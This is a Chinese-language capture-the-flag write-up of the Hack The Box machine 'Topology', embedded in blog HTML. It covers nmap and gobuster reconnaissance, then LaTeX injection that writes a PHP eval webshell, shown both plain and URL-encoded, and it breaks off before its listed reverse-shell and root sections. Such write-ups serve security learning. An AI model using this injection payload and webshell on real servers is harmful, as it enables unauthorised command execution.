@@ -1,0 +1,773 @@
+<!DOCTYPE html>
+<html>
+<head>
+    
+
+    
+
+    
+
+
+
+    <meta name="referrer" content="no-referrer">
+    <meta charset="utf-8">
+    
+    
+    
+    
+    <title>Topology | Someb0dy&#39;s blog</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    
+    <meta name="theme-color" content="#3F51B5">
+    
+    
+    <meta name="keywords" content="latexInject">
+    <meta name="description" content="Nmap┌──(root💀kali)-[~] └─# nmap -A 10.10.11.217                                                       Starting Nmap 7.93 ( https:&#x2F;&#x2F;nmap.org ) at 2023-06-11 22:39 EDT Verbosity Increased to 1. Stats:">
+<meta name="keywords" content="latexInject">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Topology">
+<meta property="og:url" content="someb0dy.github.io/2023/06/14/Topology/index.html">
+<meta property="og:site_name" content="Someb0dy&#39;s blog">
+<meta property="og:description" content="Nmap┌──(root💀kali)-[~] └─# nmap -A 10.10.11.217                                                       Starting Nmap 7.93 ( https:&#x2F;&#x2F;nmap.org ) at 2023-06-11 22:39 EDT Verbosity Increased to 1. Stats:">
+<meta property="og:locale" content="en">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2023/png/33561677/1686537735426-5ab0a57d-600c-4ffd-ad8e-0ac47988997d.png#averageHue=%231b1b1b&clientId=u741a7c7d-57a2-4&from=paste&height=181&id=u06831c16&originHeight=249&originWidth=524&originalType=binary&ratio=1.375&rotation=0&showTitle=false&size=21509&status=done&style=none&taskId=u1b4341ea-313f-46ca-a7ff-7a904ee1f0e&title=&width=381.09090909090907">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2023/png/33561677/1686537752019-a2aed801-0b7e-4290-ba41-97915ccfcb73.png#averageHue=%23f2f0f0&clientId=u741a7c7d-57a2-4&from=paste&height=620&id=ue26b0550&originHeight=852&originWidth=1801&originalType=binary&ratio=1.375&rotation=0&showTitle=false&size=367788&status=done&style=none&taskId=uf01fe5ad-57b5-4714-b6dd-0546fd24040&title=&width=1309.8181818181818">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2023/png/33561677/1686537910465-925eac50-4914-4649-ac92-743ae3991cb3.png#averageHue=%23fbfbfb&clientId=u741a7c7d-57a2-4&from=paste&height=481&id=u5bd684b7&originHeight=661&originWidth=1616&originalType=binary&ratio=1.375&rotation=0&showTitle=false&size=56348&status=done&style=none&taskId=u2d1e3373-9a11-4f87-bc2a-49cf44156dc&title=&width=1175.2727272727273">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2023/png/33561677/1686537902279-11a24b3e-1ed4-43ac-8f72-653026c8b5ab.png#averageHue=%231d1d1d&clientId=u741a7c7d-57a2-4&from=paste&height=41&id=ubedcc23d&originHeight=57&originWidth=500&originalType=binary&ratio=1.375&rotation=0&showTitle=false&size=5316&status=done&style=none&taskId=ua4296377-2e21-4d2d-a30a-c22ae8d31d6&title=&width=363.6363636363636">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2023/png/33561677/1686568201910-4c08c43c-d550-4377-88d0-ee1db629cd9c.png#averageHue=%23fefdfd&clientId=u4ea9d6a6-ecf1-4&from=paste&height=614&id=u939f1581&originHeight=844&originWidth=1639&originalType=binary&ratio=1.375&rotation=0&showTitle=false&size=99703&status=done&style=none&taskId=u808df5f9-7502-4deb-8240-b71630a1bff&title=&width=1192">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2023/png/33561677/1686568710450-6c579840-63cc-4a68-ab01-9a29fd08bcc8.png#averageHue=%23fefdfd&clientId=u4ea9d6a6-ecf1-4&from=paste&height=345&id=u6a3cabd1&originHeight=475&originWidth=1506&originalType=binary&ratio=1.375&rotation=0&showTitle=false&size=52796&status=done&style=none&taskId=u20480ddc-3f7d-43f3-87fa-e5420d6bb1c&title=&width=1095.2727272727273">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2023/png/33561677/1686568706803-b1429200-e523-4a04-bc62-4dd2a63b4d00.png#averageHue=%23151515&clientId=u4ea9d6a6-ecf1-4&from=paste&height=438&id=u0ff65e77&originHeight=602&originWidth=1363&originalType=binary&ratio=1.375&rotation=0&showTitle=false&size=19216&status=done&style=none&taskId=uabc22f1c-f043-495a-b433-8638304aa01&title=&width=991.2727272727273">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2023/png/33561677/1686568887424-d388ce69-c3e5-4960-9e44-8dc2f815908a.png#averageHue=%23fdfdfc&clientId=u4ea9d6a6-ecf1-4&from=paste&height=373&id=u395ad6e9&originHeight=513&originWidth=1355&originalType=binary&ratio=1.375&rotation=0&showTitle=false&size=61043&status=done&style=none&taskId=u1a93e0fe-4f4a-4627-a94e-dc68b2f8a18&title=&width=985.4545454545455">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2023/png/33561677/1686568916683-ce88e9be-9521-439b-beb0-861509a6e9b5.png#averageHue=%231a1a1a&clientId=u4ea9d6a6-ecf1-4&from=paste&height=446&id=u1be045c3&originHeight=613&originWidth=1543&originalType=binary&ratio=1.375&rotation=0&showTitle=false&size=40103&status=done&style=none&taskId=ucdd46dba-1d80-46a1-89f5-ed2b1a2ea81&title=&width=1122.1818181818182">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2023/png/33561677/1686569073600-828befd1-b809-4da8-a3d5-962a91104cb2.png#averageHue=%23a2d0a6&clientId=u4ea9d6a6-ecf1-4&from=paste&height=544&id=ucafe655e&originHeight=748&originWidth=1493&originalType=binary&ratio=1.375&rotation=0&showTitle=false&size=87432&status=done&style=none&taskId=u7950ed1a-cc81-401b-a358-a304b1f7f37&title=&width=1085.8181818181818">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2023/png/33561677/1686569310442-ae180132-09b7-4859-a257-a9902b2981ed.png#averageHue=%232d2d2d&clientId=u4ea9d6a6-ecf1-4&from=paste&height=431&id=u31a2318c&originHeight=592&originWidth=1403&originalType=binary&ratio=1.375&rotation=0&showTitle=false&size=104447&status=done&style=none&taskId=ube529536-1453-49aa-9d8a-eb976f24854&title=&width=1020.3636363636364">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2023/png/33561677/1686569318130-d8e28d2f-adfe-49da-bcf0-42d718d2b558.png#averageHue=%23fdfcfc&clientId=u4ea9d6a6-ecf1-4&from=paste&height=274&id=u78f31450&originHeight=377&originWidth=1654&originalType=binary&ratio=1.375&rotation=0&showTitle=false&size=19619&status=done&style=none&taskId=udcc12ff4-cc36-4828-9b19-0d1f60dbace&title=&width=1202.909090909091">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2023/png/33561677/1686569288468-eb8a9da5-93f8-45dd-b5d2-99c5b9960b3b.png#averageHue=%23d4bb7c&clientId=u4ea9d6a6-ecf1-4&from=paste&height=245&id=u2ebd049c&originHeight=337&originWidth=1517&originalType=binary&ratio=1.375&rotation=0&showTitle=false&size=38827&status=done&style=none&taskId=u5bb86b6c-075f-47ff-9e59-4d410473353&title=&width=1103.2727272727273">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2023/png/33561677/1686569518708-b6bea1b2-347d-4f4a-aa07-4f0c3823cee6.png#averageHue=%23fbfafa&clientId=u4ea9d6a6-ecf1-4&from=paste&height=407&id=u8511bea7&originHeight=559&originWidth=1064&originalType=binary&ratio=1.375&rotation=0&showTitle=false&size=45107&status=done&style=none&taskId=u51c40508-db70-46ae-b9d5-acb8961c071&title=&width=773.8181818181819">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2023/png/33561677/1686569492465-00bd84e8-ef01-4898-9e1f-f6247a31706c.png#averageHue=%232e2e2e&clientId=u4ea9d6a6-ecf1-4&from=paste&height=396&id=uda8abe58&originHeight=545&originWidth=1288&originalType=binary&ratio=1.375&rotation=0&showTitle=false&size=105645&status=done&style=none&taskId=u0617909c-4c51-4c10-9be3-0a3ee6476ed&title=&width=936.7272727272727">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2023/png/33561677/1686570044608-3e459b73-57cc-4e88-b269-22f1619be09e.png#averageHue=%23212121&clientId=u4ea9d6a6-ecf1-4&from=paste&height=601&id=u131c5813&originHeight=826&originWidth=1820&originalType=binary&ratio=1.375&rotation=0&showTitle=false&size=207358&status=done&style=none&taskId=ua78bdf46-08b4-4925-a30e-bb01b78fe2f&title=&width=1323.6363636363637">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2023/png/33561677/1686570135827-896db02f-2273-444b-a550-cd608ed0357d.png#averageHue=%23161616&clientId=u4ea9d6a6-ecf1-4&from=paste&height=73&id=u77b0a8ca&originHeight=100&originWidth=400&originalType=binary&ratio=1.375&rotation=0&showTitle=false&size=5761&status=done&style=none&taskId=u60e0deb0-fca5-48eb-90cb-f740e5cc663&title=&width=290.90909090909093">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2023/png/33561677/1686570185908-66e8b1ad-601b-4376-8dac-c1dee2bb7a0b.png#averageHue=%23191919&clientId=u4ea9d6a6-ecf1-4&from=paste&height=301&id=u865e6ac9&originHeight=414&originWidth=866&originalType=binary&ratio=1.375&rotation=0&showTitle=false&size=47467&status=done&style=none&taskId=u0b9b2b3d-a378-4c59-8809-bf0d2bc8246&title=&width=629.8181818181819">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2023/png/33561677/1686570444987-ed771078-1bc3-4f15-8548-6d9e8c5de2e7.png#averageHue=%23d4f6d0&clientId=u4ea9d6a6-ecf1-4&from=paste&height=565&id=u60c5e3c9&originHeight=777&originWidth=1201&originalType=binary&ratio=1.375&rotation=0&showTitle=false&size=123252&status=done&style=none&taskId=u6b99d325-4644-40f2-b282-ceebf9321ba&title=&width=873.4545454545455">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2023/png/33561677/1686570607068-ee5c8b4d-a39d-49c3-98aa-26c64f5ce8bb.png#averageHue=%23141414&clientId=u4ea9d6a6-ecf1-4&from=paste&height=591&id=u7baf249d&originHeight=812&originWidth=1217&originalType=binary&ratio=1.375&rotation=0&showTitle=false&size=111639&status=done&style=none&taskId=u4f71a571-75a6-41f2-a2b8-886c062b6a4&title=&width=885.0909090909091">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2023/png/33561677/1686572197689-81fef2b7-b113-406e-9613-ef0b6a949a8c.png#averageHue=%23fefefe&clientId=u4ea9d6a6-ecf1-4&from=paste&height=353&id=u70d768c9&originHeight=486&originWidth=1244&originalType=binary&ratio=1.375&rotation=0&showTitle=false&size=20046&status=done&style=none&taskId=u646b5010-e114-441e-8f7f-91b5441cdc7&title=&width=904.7272727272727">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2023/png/33561677/1686572313094-b695e2a6-22a4-4292-968d-1140dec5aec5.png#averageHue=%231a1a1a&clientId=u4ea9d6a6-ecf1-4&from=paste&height=378&id=ud170a76e&originHeight=520&originWidth=960&originalType=binary&ratio=1.375&rotation=0&showTitle=false&size=64936&status=done&style=none&taskId=u41d6f3dd-c34a-4d33-bbb1-a95eff59dc4&title=&width=698.1818181818181">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2023/png/33561677/1686572906747-fc8ce62e-1458-4afc-b73b-3e418fa2b229.png#averageHue=%23111111&clientId=u4ea9d6a6-ecf1-4&from=paste&height=284&id=u21c5450b&originHeight=391&originWidth=1596&originalType=binary&ratio=1.375&rotation=0&showTitle=false&size=111287&status=done&style=none&taskId=u06009f69-904c-473d-b83f-f41827e6c34&title=&width=1160.7272727272727">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2023/png/33561677/1686573669003-3cc42f61-01d6-4c6a-b360-dc38be644c8c.png#averageHue=%23faf9f8&clientId=u4ea9d6a6-ecf1-4&from=paste&height=561&id=ua7ab64f8&originHeight=771&originWidth=1920&originalType=binary&ratio=1.375&rotation=0&showTitle=false&size=86713&status=done&style=none&taskId=ueec1a7af-6b82-48bb-93cd-0be18b1ce0a&title=&width=1396.3636363636363">
+<meta property="og:updated_time" content="2023-06-14T06:41:47.036Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://cdn.nlark.com/yuque/0/2023/png/33561677/1686537735426-5ab0a57d-600c-4ffd-ad8e-0ac47988997d.png#averageHue=%231b1b1b&clientId=u741a7c7d-57a2-4&from=paste&height=181&id=u06831c16&originHeight=249&originWidth=524&originalType=binary&ratio=1.375&rotation=0&showTitle=false&size=21509&status=done&style=none&taskId=u1b4341ea-313f-46ca-a7ff-7a904ee1f0e&title=&width=381.09090909090907">
+    
+    <link rel="shortcut icon" href="/favicon.ico">
+    <link rel="stylesheet" href="//unpkg.com/hexo-theme-material-indigo@latest/css/style.css">
+    <script>window.lazyScripts=[]</script>
+
+    <!-- custom head -->
+    
+
+</head>
+
+<body>
+    <div id="loading" class="active"></div>
+
+    <aside id="menu" class="hide" >
+  <div class="inner flex-row-vertical">
+    <a href="javascript:;" target="_blank" rel="noopener" class="header-icon waves-effect waves-circle waves-light" id="menu-off">
+        <i class="icon icon-lg icon-close"></i>
+    </a>
+    <div class="brand-wrap" style="background-image:url(/img/brand.jpg)">
+      <div class="brand">
+        <a href="/" class="avatar waves-effect waves-circle waves-light">
+          <img src="/img/avatar.jpg">
+        </a>
+        <hgroup class="introduce">
+          <h5 class="nickname">Someb0dy</h5>
+          <a href="mailto:1362460837@qq.com" target="_blank" rel="noopener" title="1362460837@qq.com" class="mail">1362460837@qq.com</a>
+        </hgroup>
+      </div>
+    </div>
+    <div class="scroll-wrap flex-col">
+      <ul class="nav">
+        
+            <li class="waves-block waves-effect">
+              <a href="/"  >
+                <i class="icon icon-lg icon-home"></i>
+                主页
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="/archives"  >
+                <i class="icon icon-lg icon-archives"></i>
+                Archives
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="/tags"  >
+                <i class="icon icon-lg icon-tags"></i>
+                Tags
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="/categories"  >
+                <i class="icon icon-lg icon-th-list"></i>
+                Categories
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="https://github.com/Giraffe711" target="_blank" >
+                <i class="icon icon-lg icon-github"></i>
+                Github
+              </a>
+            </li>
+        
+      </ul>
+    </div>
+  </div>
+</aside>
+
+    <main id="main">
+        <header class="top-header" id="header">
+    <div class="flex-row">
+        <a href="javascript:;" target="_blank" rel="noopener" class="header-icon waves-effect waves-circle waves-light on" id="menu-toggle">
+          <i class="icon icon-lg icon-navicon"></i>
+        </a>
+        <div class="flex-col header-title ellipsis">Topology</div>
+        
+        <div class="search-wrap" id="search-wrap">
+            <a href="javascript:;" target="_blank" rel="noopener" class="header-icon waves-effect waves-circle waves-light" id="back">
+                <i class="icon icon-lg icon-chevron-left"></i>
+            </a>
+            <input type="text" id="key" class="search-input" autocomplete="off" placeholder="Search">
+            <a href="javascript:;" target="_blank" rel="noopener" class="header-icon waves-effect waves-circle waves-light" id="search">
+                <i class="icon icon-lg icon-search"></i>
+            </a>
+        </div>
+        
+        
+        <a href="javascript:;" target="_blank" rel="noopener" class="header-icon waves-effect waves-circle waves-light" id="menuShare">
+            <i class="icon icon-lg icon-share-alt"></i>
+        </a>
+        
+    </div>
+</header>
+<header class="content-header post-header">
+
+    <div class="container fade-scale">
+        <h1 class="title">Topology</h1>
+        <h5 class="subtitle">
+            
+                <time datetime="2023-06-14T06:40:44.058Z" itemprop="datePublished" class="page-time">
+  2023-06-14
+</time>
+
+
+	<ul class="article-category-list"><li class="article-category-list-item"><a class="article-category-list-link" href="/categories/HTB/">HTB</a></li></ul>
+
+            
+        </h5>
+    </div>
+
+    
+
+
+</header>
+
+
+<div class="container body-wrap">
+    
+    <aside class="post-widget">
+        <nav class="post-toc-wrap post-toc-shrink" id="post-toc">
+            <h4>TOC</h4>
+            <ol class="post-toc"><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#Nmap"><span class="post-toc-number">1.</span> <span class="post-toc-text">Nmap</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#vhost-爆破"><span class="post-toc-number">2.</span> <span class="post-toc-text">vhost 爆破</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#null"><span class="post-toc-number">2.1.</span> <span class="post-toc-text"></span></a></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#latex-topology-htb"><span class="post-toc-number">3.</span> <span class="post-toc-text">latex.topology.htb</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#鞭策gpt获取latex语法"><span class="post-toc-number">3.1.</span> <span class="post-toc-text">鞭策gpt获取latex语法</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#修改后的webshell"><span class="post-toc-number">3.2.</span> <span class="post-toc-text">修改后的webshell</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#反弹shell"><span class="post-toc-number">3.3.</span> <span class="post-toc-text">反弹shell</span></a></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#dev-topology-htb"><span class="post-toc-number">4.</span> <span class="post-toc-text">dev.topology.htb</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#Root"><span class="post-toc-number">5.</span> <span class="post-toc-text">Root</span></a></li></ol>
+        </nav>
+    </aside>
+
+
+<article id="post-Topology"
+  class="post-article article-type-post fade" itemprop="blogPost">
+
+    <div class="post-card">
+        <h1 class="post-card-title">Topology</h1>
+        <div class="post-meta">
+            <time class="post-time" title="2023-06-14 14:40:44" datetime="2023-06-14T06:40:44.058Z"  itemprop="datePublished">2023-06-14</time>
+
+            
+	<ul class="article-category-list"><li class="article-category-list-item"><a class="article-category-list-link" href="/categories/HTB/">HTB</a></li></ul>
+
+
+
+            
+<span id="busuanzi_container_page_pv" title="文章总阅读量" style='display:none'>
+    <i class="icon icon-eye icon-pr"></i><span id="busuanzi_value_page_pv"></span>
+</span>
+
+
+        </div>
+        <div class="post-content" id="post-content" itemprop="postContent">
+            <h1 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a>Nmap</h1><pre><code class="bash">┌──(root💀kali)-[~]
+└─# nmap -A 10.10.11.217                                                      
+Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-11 22:39 EDT
+Verbosity Increased to 1.
+Stats: 0:01:12 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
+NSE: Active NSE Script Threads: 1 (1 waiting)
+NSE Timing: About 93.75% done; ETC: 22:40 (0:00:00 remaining)
+Verbosity Increased to 2.
+Completed NSE at 22:40, 7.32s elapsed
+NSE: Starting runlevel 3 (of 3) scan.
+Initiating NSE at 22:40
+Completed NSE at 22:40, 0.00s elapsed
+Nmap scan report for localhost (10.10.11.217)
+Host is up (0.18s latency).
+Scanned at 2023-06-11 22:39:04 EDT for 73s
+Not shown: 998 closed tcp ports (reset)
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey:
+|   3072 dcbc3286e8e8457810bc2b5dbf0f55c6 (RSA)
+|   256 d9f339692c6c27f1a92d506ca79f1c33 (ECDSA)
+|_  256 4ca65075d0934f9c4a1b890a7a2708d7 (ED25519)
+80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
+|_http-title: Miskatonic University | Topology Group
+|_http-server-header: Apache/2.4.41 (Ubuntu)
+No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
+TCP/IP fingerprint:
+</code></pre>
+<p>经典22 和80 端口</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2023/png/33561677/1686537735426-5ab0a57d-600c-4ffd-ad8e-0ac47988997d.png#averageHue=%231b1b1b&clientId=u741a7c7d-57a2-4&from=paste&height=181&id=u06831c16&originHeight=249&originWidth=524&originalType=binary&ratio=1.375&rotation=0&showTitle=false&size=21509&status=done&style=none&taskId=u1b4341ea-313f-46ca-a7ff-7a904ee1f0e&title=&width=381.09090909090907" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+<p>添加&#x2F;etc&#x2F;hosts文件</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2023/png/33561677/1686537752019-a2aed801-0b7e-4290-ba41-97915ccfcb73.png#averageHue=%23f2f0f0&clientId=u741a7c7d-57a2-4&from=paste&height=620&id=ue26b0550&originHeight=852&originWidth=1801&originalType=binary&ratio=1.375&rotation=0&showTitle=false&size=367788&status=done&style=none&taskId=uf01fe5ad-57b5-4714-b6dd-0546fd24040&title=&width=1309.8181818181818" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+
+
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2023/png/33561677/1686537910465-925eac50-4914-4649-ac92-743ae3991cb3.png#averageHue=%23fbfbfb&clientId=u741a7c7d-57a2-4&from=paste&height=481&id=u5bd684b7&originHeight=661&originWidth=1616&originalType=binary&ratio=1.375&rotation=0&showTitle=false&size=56348&status=done&style=none&taskId=u2d1e3373-9a11-4f87-bc2a-49cf44156dc&title=&width=1175.2727272727273" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+<p>网页上发现别的子域名</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2023/png/33561677/1686537902279-11a24b3e-1ed4-43ac-8f72-653026c8b5ab.png#averageHue=%231d1d1d&clientId=u741a7c7d-57a2-4&from=paste&height=41&id=ubedcc23d&originHeight=57&originWidth=500&originalType=binary&ratio=1.375&rotation=0&showTitle=false&size=5316&status=done&style=none&taskId=ua4296377-2e21-4d2d-a30a-c22ae8d31d6&title=&width=363.6363636363636" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+
+<h1 id="vhost-爆破"><a href="#vhost-爆破" class="headerlink" title="vhost 爆破"></a>vhost 爆破</h1><pre><code class="bash">┌──(root💀kali)-[/home/kali/hacktheboxtools/machine/topology]
+└─# gobuster vhost -u http://topology.htb --append-domain -w /usr/share/SecLists/Discovery/DNS/subdomains-top1million-110000.txt -t 100    
+</code></pre>
+<p>这里爆破到了一个dev.topology.htb的域名</p>
+<h2 id=""><a href="#" class="headerlink" title=""></a></h2><h1 id="latex-topology-htb"><a href="#latex-topology-htb" class="headerlink" title="latex.topology.htb"></a>latex.topology.htb</h1><figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2023/png/33561677/1686568201910-4c08c43c-d550-4377-88d0-ee1db629cd9c.png#averageHue=%23fefdfd&clientId=u4ea9d6a6-ecf1-4&from=paste&height=614&id=u939f1581&originHeight=844&originWidth=1639&originalType=binary&ratio=1.375&rotation=0&showTitle=false&size=99703&status=done&style=none&taskId=u808df5f9-7502-4deb-8240-b71630a1bff&title=&width=1192" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+<p>这个域名下面的应用可以利用laTex表达式生成pdf文件</p>
+<p>比如输入 <strong>\frac{x+5}{y-3}</strong></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2023/png/33561677/1686568710450-6c579840-63cc-4a68-ab01-9a29fd08bcc8.png#averageHue=%23fefdfd&clientId=u4ea9d6a6-ecf1-4&from=paste&height=345&id=u6a3cabd1&originHeight=475&originWidth=1506&originalType=binary&ratio=1.375&rotation=0&showTitle=false&size=52796&status=done&style=none&taskId=u20480ddc-3f7d-43f3-87fa-e5420d6bb1c&title=&width=1095.2727272727273" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2023/png/33561677/1686568706803-b1429200-e523-4a04-bc62-4dd2a63b4d00.png#averageHue=%23151515&clientId=u4ea9d6a6-ecf1-4&from=paste&height=438&id=u0ff65e77&originHeight=602&originWidth=1363&originalType=binary&ratio=1.375&rotation=0&showTitle=false&size=19216&status=done&style=none&taskId=uabc22f1c-f043-495a-b433-8638304aa01&title=&width=991.2727272727273" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+<p>就生成了对应的pdf图片，起初很懵逼不知道该怎么做 后来搜着搜着看到了</p>
+<p>Refer-HackTrick:<a href="https://book.hacktricks.xyz/pentesting-web/formula-doc-latex-injection#latex-injection" target="_blank" rel="noopener">https://book.hacktricks.xyz/pentesting-web/formula-doc-latex-injection#latex-injection</a><br>Refer-github:<a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/LaTeX%20Injection" target="_blank" rel="noopener">https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/LaTeX%20Injection</a><br>存在laTex表达式注入 </p>
+<p>试试最简单的文件包含</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2023/png/33561677/1686568887424-d388ce69-c3e5-4960-9e44-8dc2f815908a.png#averageHue=%23fdfdfc&clientId=u4ea9d6a6-ecf1-4&from=paste&height=373&id=u395ad6e9&originHeight=513&originWidth=1355&originalType=binary&ratio=1.375&rotation=0&showTitle=false&size=61043&status=done&style=none&taskId=u1a93e0fe-4f4a-4627-a94e-dc68b2f8a18&title=&width=985.4545454545455" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2023/png/33561677/1686568916683-ce88e9be-9521-439b-beb0-861509a6e9b5.png#averageHue=%231a1a1a&clientId=u4ea9d6a6-ecf1-4&from=paste&height=446&id=u1be045c3&originHeight=613&originWidth=1543&originalType=binary&ratio=1.375&rotation=0&showTitle=false&size=40103&status=done&style=none&taskId=ucdd46dba-1d80-46a1-89f5-ed2b1a2ea81&title=&width=1122.1818181818182" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+<p>发现被ban了</p>
+<h2 id="鞭策gpt获取latex语法"><a href="#鞭策gpt获取latex语法" class="headerlink" title="鞭策gpt获取latex语法"></a>鞭策gpt获取latex语法</h2><figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2023/png/33561677/1686569073600-828befd1-b809-4da8-a3d5-962a91104cb2.png#averageHue=%23a2d0a6&clientId=u4ea9d6a6-ecf1-4&from=paste&height=544&id=ucafe655e&originHeight=748&originWidth=1493&originalType=binary&ratio=1.375&rotation=0&showTitle=false&size=87432&status=done&style=none&taskId=u7950ed1a-cc81-401b-a358-a304b1f7f37&title=&width=1085.8181818181818" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+<p>发现</p>
+<pre><code class="latex">\begin{filecontents}{myfile.txt}
+Hello, World!
+\end{filecontents}
+</code></pre>
+<p>这个语法可以写入文件，该站点又是php写的尝试写一个马 </p>
+<pre><code class="latex">\begin{filecontents}{someb0dy.php}
+&lt;?php @eval($_POST[&#39;cmd&#39;]); ?&gt;
+\end{filecontents}
+</code></pre>
+<p>url编码</p>
+<pre><code class="latex">%5Cbegin%7Bfilecontents%7D%7Bsomeb0dy.php%7D%0A%3C%3Fphp%20%40eval%28%24_POST%5B%27cmd%27%5D%29%3B%20%3F%3E%0A%5Cend%7Bfilecontents%7D
+</code></pre>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2023/png/33561677/1686569310442-ae180132-09b7-4859-a257-a9902b2981ed.png#averageHue=%232d2d2d&clientId=u4ea9d6a6-ecf1-4&from=paste&height=431&id=u31a2318c&originHeight=592&originWidth=1403&originalType=binary&ratio=1.375&rotation=0&showTitle=false&size=104447&status=done&style=none&taskId=ube529536-1453-49aa-9d8a-eb976f24854&title=&width=1020.3636363636364" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2023/png/33561677/1686569318130-d8e28d2f-adfe-49da-bcf0-42d718d2b558.png#averageHue=%23fdfcfc&clientId=u4ea9d6a6-ecf1-4&from=paste&height=274&id=u78f31450&originHeight=377&originWidth=1654&originalType=binary&ratio=1.375&rotation=0&showTitle=false&size=19619&status=done&style=none&taskId=udcc12ff4-cc36-4828-9b19-0d1f60dbace&title=&width=1202.909090909091" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+
+
+
+<p>但是发现好像没有写入成功 ，呜呜写了好久写不进去-_-，继续鞭策</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
